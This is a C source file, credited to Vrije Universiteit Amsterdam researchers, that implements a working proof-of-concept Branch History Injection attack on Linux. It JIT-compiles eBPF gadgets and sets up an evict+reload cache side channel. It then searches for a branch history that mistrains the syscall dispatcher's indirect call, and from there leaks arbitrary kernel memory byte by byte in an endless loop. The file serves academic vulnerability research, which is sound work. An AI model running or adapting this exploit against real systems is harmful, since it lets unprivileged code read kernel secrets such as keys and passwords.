/*
 * Thursday, September 9th 2021
 *
 * Enrico Barberis - e.barberis@vu.nl
 * Pietro Frigo - p.frigo@vu.nl
 * Marius Muench - m.muench@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define _GNU_SOURCE
#define GPLv2 "GPL v2"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/resource.h>
#include "targets.h"
#include "ebpf_helper.h"
#include "evict.h"
#include "helper.h"

#define ITER 10

#define FR_ENTRIES 2
#define FR_MASK 0x1
#define FR_STRIDE 0x1000
#define FR_STRIDE_LOG 12
#define FR_SIZE (FR_ENTRIES*FR_STRIDE)

//With more than 4k aliasing addresses is almost certain to evict a cache line
#define EV_SET_SIZE     (256*24)
#define EV_SET_MAP_SIZE (EV_SET_SIZE*0x1000)
#define MAX_MAP_SIZE    (256*0x1000)
#define EV_SET_MAP_NUM  (EV_SET_MAP_SIZE/MAX_MAP_SIZE)

//On the 10700k 8192 congurent addresses give a P of eviction = 0.99935
#define SYS_CALL_TABLE_EV_SET_SIZE      (8192)
#define SYS_CALL_TABLE_EV_SET_MAP_SIZE  (SYS_CALL_TABLE_EV_SET_SIZE*0x1000)

//Dummy syscall, choosen far away from standard ones to avoid prefetch
#define SYSCALL_MISTRAIN 236
#define SYSCALL_MISTRAIN_STR "236"

//externs
extern void fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3,
                     uint64_t usr_r12);

//-------------------------------------------------------------------------
// Global variables
//-------------------------------------------------------------------------
//eBPF programs
int fd_reload;
int sock_reload;
int fd_evict[EV_SET_MAP_NUM];
int sock_evict[EV_SET_MAP_NUM];
int fd_hit_0, fd_hit_1;
int sock_hit_0, sock_hit_1;
int fd_gadget_hist;
int sock_gadget_hist;
int fd_gadget_leak;
int sock_gadget_leak;

//eBPF maps
int map_array_fd_evict[EV_SET_MAP_NUM];
int map_array_fd_fr_buf;
int map_array_fd_time;
    
//arguments
uint64_t leak_addr = 0;
uint64_t sys_call_table_off = 0;
char     colliding_history[MAX_HISTORY_SIZE+1] = "";
uint64_t thr_syscall = 350; //Default value tested on a 10700K
uint64_t thr_fr_buf = 40;   //Default value tested on a 10700K
uint64_t ev_set_min = 4096;  //Default value
int      evict_syscall = 0; //1 to try to evict syscall table, 0 to skip this

//eviction stuff
uint8_t *pool;
ev_set_t ev_set_sys;
uint8_t history[MAX_HISTORY_SIZE];

//-------------------------------------------------------------------------
// Helper functions
//-------------------------------------------------------------------------
void evict_fr_buf()
{
    for(int i=0; i<EV_SET_MAP_NUM; i++) {
        trigger_ebpf(sock_evict[i], 0);
    }
    for(int i=EV_SET_MAP_NUM-1; i>0; i--) {
        trigger_ebpf(sock_evict[i], 0);
    }
}

uint64_t measure_syscall()
{
    uint64_t t0 = rdtscp();
    asm volatile("mov $"SYSCALL_MISTRAIN_STR", %rax\n syscall");
    return rdtscp()-t0;  
}

void find_ev_set_for_sys_call_table(int sys_call_table_off) {
    float avg;
    int   min, max, hits;
    uint64_t t;

    //Initialize eviction set
    pool = mmap(NULL, SYS_CALL_TABLE_EV_SET_MAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    for(int i=0; i<SYS_CALL_TABLE_EV_SET_MAP_SIZE; i++) {
        pool[i] = (uint8_t) rand(); //avoid memory deduplication
    }

    memset(&ev_set_sys, 0, sizeof(ev_set_sys));
    for(int i=0; i<SYS_CALL_TABLE_EV_SET_SIZE; i++) {
        enqueue(&ev_set_sys, &pool[ (i*0x1000) + sys_call_table_off + (8*SYSCALL_MISTRAIN)]);
    }

    //Show timings without evicction
    avg = 0;
    min = 9999999;
    max = 0;
    for(int i=0; i<1000; i++) {
        t = measure_syscall();
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg / 1000;
    printf("[+] Syscall time without eviction:          avg: %4.2f  min: %4d  max: %4d\n", avg, min, max);
    
    //Show timings with large eviction
    avg = 0;
    min = 9999999;
    max = 0;
    for(int i=0; i<1000; i++) {
        t = measure_syscall();
        evict(&ev_set_sys);
        t = measure_syscall();
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg / 1000;
    printf("[+] Syscall time with large eviction set:   avg: %4.2f  min: %4d  max: %4d\n", avg, min, max);

    //Reduce eviction set
    while(ev_set_sys.size > ev_set_min) {
        printf("\rReducing eviction set size: %5d", ev_set_sys.size);
        fflush(stdout);

        uint8_t *bak = dequeue(&ev_set_sys);

        hits = 0;
        for(int i=0; i<20; i++) {
            t = measure_syscall();
            evict(&ev_set_sys);
            t = measure_syscall();
            if(t < thr_syscall) hits++;
        }

        if(hits > 0) {
            enqueue(&ev_set_sys, bak);
        }
    }

    //Show timings with small eviction set
    avg = 0;
    min = 9999999;
    max = 0;
    for(int i=0; i<1000; i++) {
        t = measure_syscall();
        evict(&ev_set_sys);
        t = measure_syscall();
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg / 1000;
    printf("\r[+] Syscall time with small eviction set:   avg: %4.2f  min: %4d  max: %4d\n", avg, min, max);

}

void setup_ev_set_for_fr_buf() {
    int insns_len = 0;
    struct bpf_insn insns[10000];
    float avg;
    int   min, max, hits;
    uint64_t t;

    //JIT reload timing function
    struct bpf_insn insns_reload[] = {

        //Save context in REG_9
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),

        //now = get_ns()
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        //Measure access time to fr_buf[(entry&0xff)*STRIDE]
        BPF_LD_IMM64_RAW_FULL(BPF_REG_0, 2, 0, 0, map_array_fd_fr_buf,0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0*FR_STRIDE),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        //delta = get_ns() - now
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        //arg1 = map fd
        BPF_LD_MAP_FD(BPF_REG_ARG1, map_array_fd_time),

        //arg2 = key
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),

        //arg3 = value = delta
        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -4),
        BPF_STX_MEM(BPF_W, BPF_REG_ARG3, BPF_REG_7, 0),

        //arg4 = flag = BPF_ANY
        BPF_MOV64_IMM(BPF_REG_ARG4, BPF_ANY),

        //call map_update_elem
        BPF_EMIT_CALL(BPF_FUNC_map_update_elem),
        
        //now = get_ns()
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        //Measure access time to fr_buf[(entry&0xff)*STRIDE]
        BPF_LD_IMM64_RAW_FULL(BPF_REG_0, 2, 0, 0, map_array_fd_fr_buf,0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 1*FR_STRIDE),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        //delta = get_ns() - now
        BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_7),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        //arg1 = map fd
        BPF_LD_MAP_FD(BPF_REG_ARG1, map_array_fd_time),

        //arg2 = key
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
        BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),

        //arg3 = value = delta
        BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_ARG2),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -4),
        BPF_STX_MEM(BPF_W, BPF_REG_ARG3, BPF_REG_7, 0),

        //arg4 = flag = BPF_ANY
        BPF_MOV64_IMM(BPF_REG_ARG4, BPF_ANY),

        //call map_update_elem
        BPF_EMIT_CALL(BPF_FUNC_map_update_elem),

        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    fd_reload = prog_load(insns_reload, ARRSIZE(insns_reload));
    sock_reload = create_filtered_socket_fd(fd_reload);
    trigger_ebpf(sock_reload, 1);


    //Jit a function to hit entry 0
	//0xffffffffc00b4fbf:  push   rbp
	//0xffffffffc00b4fc0:  mov    rbp,rsp
	//0xffffffffc00b4fc3:  movabs rax,0xffff888105aa4110 ;map_array_fd_fr_buf
	//0xffffffffc00b4fcd:  add    rax,0x0
	//0xffffffffc00b4fd1:  mov    rax,QWORD PTR [rax+0x0]
	//0xffffffffc00b4fd5:  xor    eax,eax
	//0xffffffffc00b4fd7:  leave  
	//0xffffffffc00b4fd8:  ret    
    struct bpf_insn insns_hit_0[] = {
        BPF_LD_IMM64_RAW_FULL(BPF_REG_0, 2, 0, 0, map_array_fd_fr_buf,0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 0*FR_STRIDE),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    fd_hit_0 = prog_load(insns_hit_0, ARRSIZE(insns_hit_0));
    sock_hit_0 = create_filtered_socket_fd(fd_hit_0);
    trigger_ebpf(sock_hit_0, 1);
    
    //Jit a function to hit entry 1
	//0xffffffffc00b6393:  push   rbp
	//0xffffffffc00b6394:  mov    rbp,rsp
	//0xffffffffc00b6397:  movabs rax,0xffff888105aa4110 ;map_array_fd_fr_buf
	//0xffffffffc00b63a1:  add    rax,0x1000
	//0xffffffffc00b63a7:  mov    rax,QWORD PTR [rax+0x0]
	//0xffffffffc00b63ab:  xor    eax,eax
	//0xffffffffc00b63ad:  leave  
	//0xffffffffc00b63ae:  ret    
    struct bpf_insn insns_hit_1[] = {
        BPF_LD_IMM64_RAW_FULL(BPF_REG_0, 2, 0, 0, map_array_fd_fr_buf,0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, 1*FR_STRIDE),
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    fd_hit_1 = prog_load(insns_hit_1, ARRSIZE(insns_hit_1));
    sock_hit_1 = create_filtered_socket_fd(fd_hit_1);
    trigger_ebpf(sock_hit_1, 1);

    //Jit functions to evict the entire fr_buf
	//0xffffffffc00b82eb:  push   rbp
	//0xffffffffc00b82ec:  mov    rbp,rsp
	//0xffffffffc00b82ef:  push   r14
	//0xffffffffc00b82f1:  movabs r14,0xffffc90000755110 ;map_array_fd_evict[i]
	//0xffffffffc00b82fb:  mov    rax,QWORD PTR [r14+0x0]
	//0xffffffffc00b82ff:  add    r14,0x1000
	//0xffffffffc00b8306:  mov    rax,QWORD PTR [r14+0x0]
	//0xffffffffc00b830a:  add    r14,0x1000
	//....
	//ret
    for(int i=0; i<EV_SET_MAP_NUM; i++) {
        insns_len = 0;
        insns[insns_len++] = BPF_RAW_INSN(BPF_LD|BPF_DW|BPF_IMM, BPF_REG_8, 2, 0, map_array_fd_evict[i]);
        insns[insns_len++] = BPF_RAW_INSN(0, 0, 0, 0, 0);
        insns[insns_len++] = BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0);
        for(int j=0; j<(MAX_MAP_SIZE/0x1000)-1; j++) {
            insns[insns_len++] = BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x1000);
            insns[insns_len++] = BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0);
        }
        insns[insns_len++] = BPF_MOV64_IMM(BPF_REG_0, 0);
        insns[insns_len++] = BPF_EXIT_INSN();
        
        fd_evict[i] = prog_load(insns, insns_len);
        sock_evict[i] = create_filtered_socket_fd(fd_evict[i]);
        trigger_ebpf(sock_evict[i], 1);
    }
    
    //Print some times to help in the decision of good threshold
    avg=0;
    min=999999;
    max=0;
    for(int j=0; j<1000; j++) {
        trigger_ebpf(sock_hit_0, 0);
        trigger_ebpf(sock_reload, 0);
        t = map_get(map_array_fd_time, 0);
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg/1000;
    printf("[+] Reload time without eviction:              avg: %4.2f  min: %4d  max: %4d\n", avg, min, max);

    avg=0;
    min=999999;
    max=0;
    for(int j=0; j<1000; j++) {
        trigger_ebpf(sock_hit_0, 0);
        evict_fr_buf();
        trigger_ebpf(sock_reload, 0);
        t = map_get(map_array_fd_time, 0);
        avg += t;
        if(t < min) min = t;
        if(t > max) max = t;
    }
    avg = avg/1000;
    printf("[+] Reload time    with eviction:              avg: %4.2f  min: %4d  max: %4d\n", avg, min, max);

    //Verify fr_buf eviction goodness
    printf("[+] Checking if we can evict all entries: \n");
    for(int i=0; i<FR_ENTRIES; i++) {
        avg = 0;
        hits = 0;
        for(int j=0; j<1000; j++) {
            if(i == 0) trigger_ebpf(sock_hit_0, 0);
            if(i == 1) trigger_ebpf(sock_hit_1, 0);

            evict_fr_buf();

            trigger_ebpf(sock_reload, 0);
            t = map_get(map_array_fd_time, i);
            avg += t;
            if(t < thr_fr_buf) hits++;
        }

        printf("    - Entry %d: %d hits (avg time %f)\n", i, hits, avg/1000); 
        if(hits > 10) { 
            exit(0);
        }
    }
    printf("    OK!\n");
}

void find_colliding_history() {
    int round = 0;
    int found = 0;
    int hits;

	//0xffffffffc00e8a77:  push   rbp
	//0xffffffffc00e8a78:  mov    rbp,rsp
	//0xffffffffc00e8a7b:  push   r14
	//0xffffffffc00e8a7d:  movabs r14,0xffff888105aa4110 ;map_array_fd_fr_buf
	//0xffffffffc00e8a87:  mov    eax,DWORD PTR [rdi+0x70] ;if executed transientlly = pt_regs->rdi
	//0xffffffffc00e8a8a:  and    rax,0x1
	//0xffffffffc00e8a8e:  shl    rax,0xc
	//0xffffffffc00e8a92:  add    r14,rax
	//0xffffffffc00e8a95:  mov    r14,QWORD PTR [r14+0x0]
	//0xffffffffc00e8a99:  xor    eax,eax
	//0xffffffffc00e8a9b:  pop    r14
	//0xffffffffc00e8a9d:  leave  
    struct bpf_insn insns_gadget_hist[] = {
        BPF_LD_IMM64_RAW_FULL(BPF_REG_8, 2, 0, 0, map_array_fd_fr_buf, 0),
        BPF_LDX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, 0),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_0, FR_MASK),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, FR_STRIDE_LOG),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8, 0),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    fd_gadget_hist = prog_load(insns_gadget_hist, ARRSIZE(insns_gadget_hist));
    sock_gadget_hist = create_filtered_socket_fd(fd_gadget_hist);
    trigger_ebpf(sock_gadget_hist, 1);

    //Not necessary but makes the experiment deterministic
    srand(time(0));

    if(strlen(colliding_history) == MAX_HISTORY_SIZE) {
        for(int i=0; i<MAX_HISTORY_SIZE; i++) {
            history[i] = colliding_history[i] - '0';
        }
        found = 1;
    }
    while(!found)
    {
        round++;
        printf("\rFinding colliding history... [Round %d]", round);
        fflush(stdout);

        //Generate new random history hoping for collision
        for(int j=0; j<MAX_HISTORY_SIZE; j++) {
            history[j] = rand()&0x1;
        }

        hits = 0;
        for(int j=0; j<ITER; j++)
        {
            if(evict_syscall) {
                evict(&ev_set_sys);
            }
            evict_fr_buf();

            trigger_ebpf(sock_gadget_hist, 0);
            fill_bhb(history, SYSCALL_MISTRAIN, 1, 0, 0, 0);

            //Reload time
            trigger_ebpf(sock_reload, 0);
            if(map_get(map_array_fd_time, 1) < thr_fr_buf) hits++;
        }

        if(hits > 0) {
            printf("\rhits: %d ", hits);
            for(int j=0; j<MAX_HISTORY_SIZE; j++)
                printf("%c", '0'+history[j]);
            printf("\n");
        }

        //Found a colliding history! Exit loop
        if(hits > ITER/2) {
            found = 1;
        } 
    }
        
    printf("[+] Colliding history found after %d tries!\n", round);
    for(int i=0; i<MAX_HISTORY_SIZE; i++) {
        printf("%c", history[i]+'0');
    }
    printf("\n");
}

void jit_leak_gadget() {
	//0xffffffffc00ea82f:  push   rbp
	//0xffffffffc00ea830:  mov    rbp,rsp
	//0xffffffffc00ea833:  mov    rax,QWORD PTR [rdi+0x18]	;pt_regs->r12 (transiently)
	//0xffffffffc00ea837:  test   rax,rax
	//0xffffffffc00ea83a:  je     0xffffffffc00ea85e
	//0xffffffffc00ea83c:  mov    eax,DWORD PTR [rax+0x14]	;this is why we need to sub 0x14 from addr to leak
	//0xffffffffc00ea83f:  mov    ecx,DWORD PTR [rdi+0x70]	;pt_regs->rdi (transiently)
	//0xffffffffc00ea842:  shr    rax,cl					;leak a bit
	//0xffffffffc00ea845:  and    rax,0x1
	//0xffffffffc00ea849:  shl    rax,0xc
	//0xffffffffc00ea84d:  movabs rsi,0xffff888105aa4110	;fr_buf
	//0xffffffffc00ea857:  add    rsi,rax
	//0xffffffffc00ea85a:  mov    rsi,QWORD PTR [rsi+0x0]
	//0xffffffffc00ea85e:  xor    eax,eax
	//0xffffffffc00ea860:  leave  
	//0xffffffffc00ea861:  ret    
    struct bpf_insn insns_gadget_leak[] = {
        BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 168),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 9),

        BPF_LDX_MEM(BPF_W, BPF_REG_0, BPF_REG_0, 0),
        BPF_LDX_MEM(BPF_W,  BPF_REG_4, BPF_REG_1, 0),
        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_4),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_0, FR_MASK),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_0, FR_STRIDE_LOG),

        BPF_LD_IMM64_RAW_FULL(BPF_REG_2, 2, 0, 0, map_array_fd_fr_buf, 0),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_0),
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_2, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };
    fd_gadget_leak = prog_load(insns_gadget_leak, ARRSIZE(insns_gadget_leak));
    sock_gadget_leak = create_filtered_socket_fd(fd_gadget_leak);
    trigger_ebpf(sock_gadget_leak, 1);
}

//Leak byte at provided kernel addr, return 0 if addr not mapped
//if provided, it also return the number of hits to check the
//leak confidence level
int leak(uint64_t addr, int *n_hits) {
    int hits;
    uint8_t byte = 0;
    *n_hits = 0;

    for(int bit_pos=0; bit_pos<8; bit_pos++) {
        hits=0;
        for(int j=0; j<ITER; j++)
        {
            if(evict_syscall) {
                evict(&ev_set_sys);
            }
            evict_fr_buf();

            trigger_ebpf(sock_gadget_leak, 0);
            fill_bhb(history, SYSCALL_MISTRAIN, bit_pos, 0, 0, addr-0x14ULL);

            trigger_ebpf(sock_reload, 0);
            //Entry 0 is always hit architecturally
            //assert(map_get(map_array_fd_time, 0) < thr_fr_buf);
            if(map_get(map_array_fd_time, 1) < thr_fr_buf) hits++;
        }
        if (hits > ITER/2) byte |= (1<<bit_pos);
        *n_hits += hits;
    }

    return byte;
}

int main(int argc, char **argv)
{
    int      opt;
    uint32_t start_time;

    //Parse and print arguments
    while ((opt = getopt(argc, argv, "a:o:h:s:f:e:l")) != -1) 
    {
        switch (opt) 
        {
            case 'a':
                sscanf(optarg, "0x%lx", &leak_addr);
                break;
            case 'o':
                sscanf(optarg, "0x%lx", &sys_call_table_off);
                break;
            case 'h':
                strncpy(colliding_history, optarg, MAX_HISTORY_SIZE); 
                colliding_history[MAX_HISTORY_SIZE] = '\x00';
                break;
            case 's':
                sscanf(optarg, "%ld", &thr_syscall);
                break;
            case 'f':
                sscanf(optarg, "%ld", &thr_fr_buf);
                break;
            case 'e':
                sscanf(optarg, "%ld", &ev_set_min);
                break;
            case 'l':
                evict_syscall = 1;
                break;
        }
    }

    printf("[+] Parsed parameters:\n");
    printf("     -  leaking from                        0x%016lx\n", leak_addr);
    printf("     -  threshold E+R buffer eviction       %ld\n", thr_fr_buf);
    if(strlen(colliding_history) > 0) {
        printf("     -  colliding_history                   %s\n", colliding_history);
    }
    if(evict_syscall) {
        printf("    sys_call_table eviction parameters:\n");
        printf("     -  sys_call_table page offset          0x%03lx\n", sys_call_table_off);
        printf("     -  threshold sys_call_table eviction   %ld\n", thr_syscall);
        printf("     -  eviction set size sys_call_table    %ld\n", ev_set_min);
    }
    

    //https://prototype-kernel.readthedocs.io/en/latest/bpf/troubleshooting.html
    const struct rlimit rlim={.rlim_cur=0x4000000, .rlim_max=0x4000000};
    assert(setrlimit(RLIMIT_MEMLOCK, &rlim)==0);

    //eBPF map allocations
    for(int i=0; i<EV_SET_MAP_NUM; i++) {
        map_array_fd_evict[i]  = map_array_create(MAX_MAP_SIZE, 1);
    }
    map_array_fd_fr_buf = map_array_create(FR_SIZE, 1);
    map_array_fd_time   = map_array_create(sizeof(uint32_t), 2);

    //-------------------------------------------------------------------------
    // STEP 0: Find eviction set for sys_call_table[MISTRAIN_SYSCALL*8]
    //         this is only needed to enlarge the transient window of
    //         the indirect call of do_syscall_64. This makes the attack
    //         stable and deterministic
    //-------------------------------------------------------------------------
    if(evict_syscall) {
        start_time = time(NULL);
        find_ev_set_for_sys_call_table(sys_call_table_off);
        printf("[+] Required time: %ld seconds\n", time(NULL)-start_time);
    }

    //-------------------------------------------------------------------------
    // STEP 1: Evict + Reload setup
    //         this step allocate an eBPF map used as fr_buf and then another
    //         map for evicting it. This step simply JIT and check that
    //         evict+reload works. The timing is performed in eBPF using
    //         the helper bpf_ktime_get_ns
    //-------------------------------------------------------------------------
    start_time = time(NULL);
    setup_ev_set_for_fr_buf();
    printf("[+] Required time: %ld seconds\n", time(NULL)-start_time);

    //-------------------------------------------------------------------------
    // STEP 2: Finding colliding history (BHB collision)
    //         using the built side channel, we randomize BHB on userland
    //         using the fill_bhb function. Eventually we mistrain the
    //         do_syscall_64 indirect branch to land on our eBPF jitted code.
    //-------------------------------------------------------------------------
    start_time = time(NULL);
    find_colliding_history();
    printf("[+] Required time: %ld seconds\n", time(NULL)-start_time);
    
    //-------------------------------------------------------------------------
    // STEP 3: Leak!
    //         Now we can transiently execute our jitted eBPF code, exploit this
    //         to read arbitrary kernel memory
    //-------------------------------------------------------------------------
    int leaked_byte[8];
    int n_hits;
    int tot_leaked = 0;

    jit_leak_gadget();

    start_time = time(NULL);
    while(1) {
        printf("0x%016lx: ", leak_addr);
        for(int i=0; i<8; i++) {
            leaked_byte[i] = leak(leak_addr+i, &n_hits);
        }

        for(int i=0; i<8; i++) printf("%02x ", leaked_byte[i]);
        printf("\t");
        for(int i=0; i<8; i++) {
            if(isprint(leaked_byte[i])) {
                printf("%c", leaked_byte[i]);
            } else {
                printf(".");
            }
        }
        leak_addr += 8;
        tot_leaked += 8;
        
        if(time(NULL) > start_time) {
            printf("\t%f B/s", (float)tot_leaked/(time(NULL)-start_time));
        }
        printf("\n");
    }

    return 0;
}
